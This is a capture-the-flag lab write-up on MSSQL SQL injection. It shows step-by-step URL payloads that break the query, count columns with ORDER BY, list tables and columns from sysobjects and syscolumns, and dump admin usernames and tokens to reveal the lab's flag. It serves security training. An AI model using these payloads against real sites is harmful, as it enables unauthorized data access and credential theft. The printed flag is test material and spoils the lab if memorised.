# Lab 5.3.2 MSSQL Error-Based Injection

Also check [Reflection Injection](../lab5.3.1_mssql_reflection_injection).

## 0x00 Basic Knowledge

In general, error-based injections are pretty much same. So, similar as [MySQL error-based injection](../lab5.2.1_mysql_error_based_injection), we can find table names and corresponding field names for union select query.

However, as there are some different syntax, and system table seetings between these databases. 


## 0x01 Go Hack It

Lab site from [zkaq.org][1]

### Home Page

![](./imgs/0_home.jpg)

### Injection Point

The **id** looks like an injection point.

Tried to colse statement with **'**, shows sql error. 

```sql
?id=2'
``` 

![](./imgs/1_err.jpg)

Tried comment out the rest of the sql statement, works again.

```sql
?id=2'--
```

![](./imgs/1_comment.jpg)

### Determine Table Fields Number

Tried **ORDER BY 1,2** all success, while 3 shows the same excution error as above.

~~So this means the query select 2 fields instead of 3 (QUESTION?)~~

```sql
?id=2' ORDER BY 2--
```

![](./imgs/2_order.jpg)

```sql
?id=2' ORDER BY 3--
```

![](./imgs/2_order_err.jpg)

> This is mainly because of the 3rd field is in **text** data type.
> Some of the data type including **text, ntext, image** do not support **ORDER BY** sorting query.

![](./imgs/data_type.png)

### Get Table Name

```sql
?id=2' AND 1=2 UNION ALL SELECT id,NULL,name FROM dbo.sysobjects WHERE xtype='U'--
```

| id         | name  |
| ---------- | ----- |
| 1977058079 | admin |
| 2009058193 | news  |

![](./imgs/3_tbl_name.jpg)

### Get Field Name

```sql
?id=2' AND 1=2 UNION ALL SELECT NULL,NULL,name FROM dbo.syscolumns WHERE id=1977058079--
```

| name     |
| -------- |
| id       |
| passwd   |
| token    |
| username |

![](./imgs/4_field.jpg)

### Get FLAG

**Special Notes**, for field 1, we can only put in **id**, which is an integer value. Otherwise, token, username, and passwd will all triger errors here. 

> The [SQL UNION ALL][3] operator is used to combine the result sets of 2 or more SELECT statements. It does not remove duplicate rows between the various SELECT statements (all rows are returned).
>
> Each SELECT statement within the UNION ALL must have the same number of fields in the result sets with **similar data types**.

```sql
?id=2' AND 1=2 UNION ALL SELECT id,username,token FROM admin--
```

![](./imgs/5_flag.jpg)

So **FLAG** = **zkaq{e9c9e67c5}**

[1]: https://hack.zkaq.org/?a=battle&f=target&id=7dd07600c96f5d55
[3]: https://www.techonthenet.com/sql/union_all.php